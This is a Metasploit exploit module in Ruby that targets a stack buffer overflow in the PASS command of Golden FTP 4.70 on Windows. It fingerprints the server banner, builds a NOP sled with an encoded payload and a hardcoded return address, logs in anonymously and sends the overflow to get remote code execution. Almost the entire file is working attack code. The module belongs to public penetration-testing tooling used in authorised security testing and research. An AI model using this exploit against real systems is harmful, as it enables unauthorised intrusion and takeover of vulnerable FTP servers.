# $Id: goldenftp_pass_bof.rb 12812 2011-06-02 01:10:22Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;GoldenFTP PASS Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the Golden
                FTP service. This module uses the PASS command to trigger the overflow.
            },
            &#039;Author&#039;         => [ &#039;bannedit&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12812 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;45957 &#039;],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/16036/&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 350,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039;       => [&#039;win&#039;],
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Golden FTP 4.70 Universal&#039;, # Tested OK - bannedit 05/31/2011
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Ret&#039;      => 0x00a93ca6,
                        },
                    ]
 
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 23 2011&#039;))
    end
     
    def check
        connect
        disconnect
        print_status("FTP Banner: #{banner}".strip)
        if banner =~ /Golden FTP Server ready v(4\.\d{2})/ and $1 == "4.70"
            return Exploit::CheckCode::Appears
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def exploit
        if datastore[&#039;RHOST&#039;].length < 15
            pad = make_nops(1) * (15 - datastore[&#039;RHOST&#039;].length)
        end
         
        sploit = make_nops(4) * 38
        sploit << payload.encoded
        sploit << pad
        sploit << make_nops(1) * (528 - sploit.length)
        sploit << [target.ret].pack(&#039;V&#039;)
 
        print_status("Connecting to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        begin
            connect
            send_user("anonymous")
            send_cmd([&#039;PASS&#039;, sploit], false)
            handler
        rescue EOFError
        end
    end
end



